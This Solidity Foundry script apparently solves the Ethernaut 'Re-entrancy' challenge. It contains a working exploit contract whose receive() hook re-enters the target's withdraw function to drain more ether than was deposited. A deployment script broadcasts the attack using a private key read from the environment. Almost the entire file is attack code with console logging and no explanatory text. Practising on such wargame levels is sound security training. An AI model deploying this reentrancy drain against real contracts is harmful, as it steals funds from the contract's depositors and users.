// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/10-Re-entrancy.sol";



contract Exploit {
    Reentrance public ReentrancyInstance = Reentrance(payable(/*获取的实例地址*/));
   
    constructor() public payable {
        console.log("Before donate - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("Before donate - hacker contract balance:", address(this).balance);
        ReentrancyInstance.donate{value: 0.001 ether}(address(this));

        console.log("After donate - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("After donate - hacker contract balance:", address(this).balance);
    }

    function withdraw() external {
        console.log("Before withdraw - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("Before withdraw - hacker contract balance:", address(this).balance);

        ReentrancyInstance.withdraw(0.001 ether);

        console.log("After withdraw - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("After withdraw - Exploit contract balance:", address(this).balance);

        (bool result,) = msg.sender.call{value: 0.002 ether}("");
        require(result);
    }

    receive() external payable {
        ReentrancyInstance.withdraw(0.001 ether);
    }
}




contract Exp is Script {

    //Reentrance public ReentrancyInstance = Reentrance(payable(0x3c86Bf260c3c0D7c40450064468ff63df66121C6));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);

        Exploit exploit = new Exploit{value: 0.001 ether}();
        exploit.withdraw();
    

        vm.stopBroadcast();
    }
}